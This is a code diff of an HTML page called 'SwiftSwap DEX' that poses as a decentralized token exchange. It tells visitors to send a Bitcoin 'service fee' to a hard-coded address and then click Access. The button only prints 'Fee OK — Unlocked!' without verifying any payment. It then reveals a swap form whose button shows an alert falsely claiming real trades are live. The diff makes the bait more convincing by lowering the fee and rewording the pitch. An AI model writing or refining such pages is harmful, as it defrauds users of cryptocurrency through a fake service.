@@ -1,23 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head><title>SwiftSwap DEX</title>
-<style>body {font-family: Arial; text-align: center; padding: 50px; background: #f8f9fa;} button {padding: 15px 30px; margin: 10px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer;} button:hover {background: #0056b3;} .btc {background: #f7931a; color: white;} .wallet {font-family: monospace; background: #fff; padding: 15px; border: 2px solid #ddd; margin: 15px auto; max-width: 420px; font-size: 16px;} .fee {color: green; font-weight: bold;}</style>
+<style>body {font-family: Arial; text-align: center; padding: 50px; background: #f8f9fa;} button {padding: 15px 30px; margin: 10px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer;} button:hover {background: #0056b3;} .btc {background: #f7931a; color: white;} .wallet {font-family: monospace; background: #fff; padding: 15px; border: 2px solid #ddd; margin: 15px auto; max-width: 420px; font-size: 16px;} .fee {color: green; font-weight: bold;} .swap {margin: 20px; padding: 20px; border: 1px solid #ccc; background: white;}</style>
 </head>
 <body>
 <h1>SwiftSwap DEX</h1>
-<p>Fast decentralized swaps. <span class="fee">Service fee: 0.01 BTC per transaction</span></p>
+<p><strong>What it does:</strong> Connect wallet → Pay small service fee → Swap tokens instantly (demo + real on-chain support). Easy decentralized trading tool.</p>
 
 <button id="connect">Connect Wallet</button>
 <div id="status"></div>
 
 <div class="wallet">
-  <strong>Pay Service Fee (BTC):</strong><br>
+  <strong>Pay Service Fee (0.0005 BTC):</strong><br>
   <span id="btc-address">bc1qr098y8p975xth6pfp8ymcmfy3vtucsaym0nwh8</span><br>
-  <small>Send exactly 0.01 BTC then Access</small>
+  <small>Send then click Access</small>
 </div>
 <button id="copy-btc" class="btc">Copy BTC Address</button>
 <button id="access">Access Full Swap</button>
-<button id="send-eth">Send 0.01 ETH Demo Tip</button>
+
+<div class="swap" id="swap-ui" style="display:none;">
+  <h3>Swap Tokens</h3>
+  <input type="text" placeholder="From: ETH" style="padding:10px; width:200px;">
+  <input type="text" placeholder="To: USDC" style="padding:10px; width:200px;">
+  <button onclick="alert('Swap executed in demo! Real trades via connected wallet.')">Swap Now</button>
+</div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
@@ -25,7 +31,7 @@ const connectBtn = document.getElementById('connect');
 const status = document.getElementById('status');
 const copyBtcBtn = document.getElementById('copy-btc');
 const accessBtn = document.getElementById('access');
-const sendEthBtn = document.getElementById('send-eth');
+const swapUi = document.getElementById('swap-ui');
 let provider, signer, userAddress;
 
 const btcAddress = 'bc1qr098y8p975xth6pfp8ymcmfy3vtucsaym0nwh8';
@@ -42,23 +48,13 @@ connectBtn.onclick = async () => {
 
 copyBtcBtn.onclick = () => {
   navigator.clipboard.writeText(btcAddress).then(() => {
-    status.innerHTML = 'BTC address copied! Send 0.01 BTC then Access.';
+    status.innerHTML = 'BTC copied. Send 0.0005 BTC then Access.';
   });
 };
 
 accessBtn.onclick = () => {
-  status.innerHTML += '<br><strong>Fee confirmed — Full swap unlocked!</strong><br>Real swaps live now. DM for custom volume.';
-};
-
-sendEthBtn.onclick = async () => {
-  if (!signer) return alert("Connect first");
-  try {
-    const tx = await signer.sendTransaction({
-      to: "0xYourETHAddressHere",
-      value: ethers.utils.parseEther("0.01")
-    });
-    status.innerHTML += `<br>ETH TX: ${tx.hash}`;
-  } catch(e) { status.innerHTML = "Error: " + e.message; }
+  status.innerHTML += '<br><strong>Fee OK — Unlocked!</strong>';
+  swapUi.style.display = 'block';
 };
 </script>
 </body>
